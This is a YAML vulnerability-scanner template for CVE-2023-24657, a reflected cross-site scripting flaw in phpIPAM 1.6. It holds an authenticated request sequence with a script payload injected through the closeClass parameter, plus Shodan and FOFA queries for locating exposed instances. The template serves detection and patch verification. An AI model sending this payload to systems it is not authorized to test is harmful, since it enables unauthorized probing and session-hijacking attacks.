http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "<script>alert(document.domain)</script>") && contains(body_2,
      "Subnet masks")
    type: dsl
  raw:
  - 'POST /app/login/login_check.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    ipamusername={{username}}&ipampassword={{password}}

    '
  - 'GET /app/tools/subnet-masks/popup.php?closeClass=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-24657
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:phpipam:phpipam:1.6:*:*:*:*:*:*:*
    cve-id: CVE-2023-24657
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.85512
    epss-score: 0.0274
  description: 'phpIPAM 1.6 contains a cross-site scripting vulnerability via the
    closeClass parameter at /subnet-masks/popup.php. An attacker can inject arbitrary
    script in the browser of an unsuspecting user in the context of the affected site.
    This can allow the attacker to steal cookie-based authentication credentials and
    launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: body="phpipam ip address management"
    max-request: 2
    product: phpipam
    shodan-query:
    - html:"phpIPAM IP address management"
    - http.html:"phpipam ip address management"
    vendor: phpipam
    verified: true
  name: phpIPAM - 1.6 - Cross-Site Scripting
  reference:
  - https://github.com/phpipam/phpipam/issues/3738
  - https://nvd.nist.gov/vuln/detail/CVE-2023-24657
  remediation: 'Upgrade to a patched version of phpIPAM or apply the necessary security
    patches provided by the vendor.

    '
  severity: medium
  tags: cve2023,cve,xss,phpipam,authenticated,vuln
